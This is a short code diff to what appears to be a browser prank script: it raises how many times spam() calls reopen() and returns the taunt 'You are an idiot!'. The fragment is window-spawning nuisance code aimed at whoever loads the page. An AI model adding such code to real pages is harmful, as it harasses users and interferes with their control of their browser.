@@ -10,7 +10,7 @@ function reopen() {
   );
 }
 function spam() {
-  for (var i = 0; i < 2; i++) {
+  for (var i = 0; i < 3; i++) {
     reopen();
   }
   return "You are an idiot!";
